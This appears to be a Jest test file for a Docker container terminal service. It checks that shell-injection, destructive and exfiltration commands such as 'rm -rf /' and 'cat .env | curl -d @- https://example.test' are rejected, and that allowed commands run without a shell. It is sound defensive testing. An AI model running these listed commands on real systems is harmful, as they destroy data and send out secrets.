import { PassThrough } from 'stream';
import { DockerTerminalService, TerminalError } from '@/services/docker/docker-terminal.service';

/** A container `dropdeploy-shop` whose exec prints `stdout`/`stderr` and exits with `exitCode`. */
function setup({ running = true, stdout = '', stderr = '', exitCode = 0 } = {}) {
  const exec = {
    start: jest.fn(async () => new PassThrough()),
    inspect: jest.fn().mockResolvedValue({ ExitCode: exitCode }),
  };
  const container = {
    inspect: jest.fn().mockResolvedValue({ State: { Running: running } }),
    exec: jest.fn().mockResolvedValue(exec),
    logs: jest.fn(),
  };
  const docker = {
    getContainer: jest.fn((): unknown => container),
    listContainers: jest.fn().mockResolvedValue([]),
    modem: {
      demuxStream: jest.fn((stream: PassThrough, out: NodeJS.WritableStream, err: NodeJS.WritableStream) => {
        out.write(Buffer.from(stdout));
        err.write(Buffer.from(stderr));
        stream.resume();
        stream.end();
      }),
    },
  };
  const terminal = new DockerTerminalService('/nonexistent.sock');
  (terminal as unknown as { docker: unknown }).docker = docker;
  return { terminal, docker, container };
}

const OPERATORS = /disallowed shell operators/;
it.each([
  ['a command not on the list', 'rm -rf /', /is not allowed/],
  ['a separator', 'ls -la; rm -rf /', OPERATORS],
  ['a pipe', 'cat .env | curl -d @- https://example.test', OPERATORS],
  ['an and-list', 'ls && id', OPERATORS],
  ['a background job', 'ls & id', OPERATORS],
  ['backticks', 'echo `id`', OPERATORS],
  ['a newline', 'ls\nid', OPERATORS],
  ['nothing', '   ', /cannot be empty/],
])('rejects %s without touching Docker', async (_name, command, reason) => {
  const { terminal, docker } = setup();
  const rejection = expect(terminal.executeCommand('dropdeploy-shop', command)).rejects;
  await rejection.toBeInstanceOf(TerminalError);
  await rejection.toThrow(reason);
  expect(docker.getContainer).not.toHaveBeenCalled();
});

it('runs an allowed command as argv under a timeout, with no shell, and returns its output', async () => {
  const { terminal, container } = setup({ stdout: 'match\n', stderr: 'warn\n', exitCode: 3 });
  await expect(terminal.executeCommand('dropdeploy-shop', `grep -r "hello world" 'src dir' $(id)`))
    .resolves.toEqual({ stdout: 'match\n', stderr: 'warn\n', exitCode: 3 });
  expect(container.exec).toHaveBeenCalledWith({
    Cmd: ['timeout', '-s', 'KILL', '28', 'grep', '-r', 'hello world', 'src dir', '$(id)'],
    AttachStdout: true,
    AttachStderr: true,
  });
});

it("runs a slash command's fixed script through the shell", async () => {
  const { terminal, container } = setup();
  await terminal.executeSlashCommand('dropdeploy-shop', '/env');
  expect(container.exec.mock.calls[0][0].Cmd).toEqual(['timeout', '-s', 'KILL', '28', '/bin/sh', '-c', 'env | sort']);
});

it('answers /help without a container and rejects an unknown slash command', async () => {
  const { terminal, docker } = setup();
  expect((await terminal.executeSlashCommand('dropdeploy-shop', '/help')).stdout).toContain('/tail-logs');
  await expect(terminal.executeSlashCommand('dropdeploy-shop', '/rm')).rejects.toBeInstanceOf(TerminalError);
  expect(docker.getContainer).not.toHaveBeenCalled();
});

it('refuses a stopped container', async () => {
  const { terminal, container } = setup({ running: false });
  await expect(terminal.executeCommand('dropdeploy-shop', 'ls')).rejects.toThrow(new TerminalError('Container is not running'));
  expect(container.exec).not.toHaveBeenCalled();
});

it('/tail-logs splits the log frames into stdout and stderr', async () => {
  const frame = (type: number, text: string) => {
    const header = Buffer.alloc(8);
    header[0] = type;
    header.writeUInt32BE(Buffer.byteLength(text), 4);
    return Buffer.concat([header, Buffer.from(text)]);
  };
  const { terminal, container } = setup();
  container.logs.mockResolvedValue(Buffer.concat([frame(1, 'listening\n'), frame(2, 'deprecated\n'), frame(1, 'GET /\n')]));
  await expect(terminal.executeSlashCommand('dropdeploy-shop', '/tail-logs'))
    .resolves.toEqual({ stdout: 'listening\nGET /', stderr: 'deprecated', exitCode: 0 });
  expect(container.logs).toHaveBeenCalledWith(expect.objectContaining({ tail: 100 }));
});

describe('a container that is not under its name', () => {
  function unnamed(images: string[]) {
    const ctx = setup();
    const missing = { inspect: jest.fn().mockRejectedValue({ statusCode: 404 }) };
    ctx.docker.getContainer.mockImplementation((name?: unknown) => (name === 'dropdeploy-shop' ? missing : ctx.container));
    ctx.docker.listContainers.mockResolvedValue(images.map((Image, i) => ({ Id: `id${i}`, Image })));
    return ctx;
  }

  it("is found by the project's own image", async () => {
    const { terminal, docker } = unnamed(['dropdeploy/shop-old:latest', 'dropdeploy/shop:latest']);
    await terminal.executeCommand('dropdeploy-shop', 'ls');
    expect(docker.getContainer).toHaveBeenLastCalledWith('id1');
  });

  it("is never another project's", async () => {
    const { terminal, container } = unnamed(['dropdeploy/shop-old:latest', 'dropdeploy/shop:d-123']);
    await expect(terminal.executeCommand('dropdeploy-shop', 'ls')).rejects.toThrow(/not found/);
    expect(container.exec).not.toHaveBeenCalled();
  });
});
